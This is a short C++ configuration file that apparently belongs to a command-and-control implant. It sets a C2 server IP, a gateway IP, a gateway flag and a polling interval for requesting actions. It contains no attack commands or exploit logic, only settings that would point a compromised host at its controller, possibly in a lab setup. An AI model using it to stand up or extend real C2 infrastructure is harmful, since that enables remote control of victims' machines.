#include "Config.hpp"


uint8_t C2IP_EDIT[4] = {172, 16, 245, 128};
uint8_t GATEWAYIP_EDIT[4] = {192, 168, 235, 1};
bool useGateway = false;
int requestActionInterval = 5000;


uint32_t C2IP = *((uint32_t *) C2IP_EDIT);
uint32_t GatewayIP = *((uint32_t *) GATEWAYIP_EDIT);


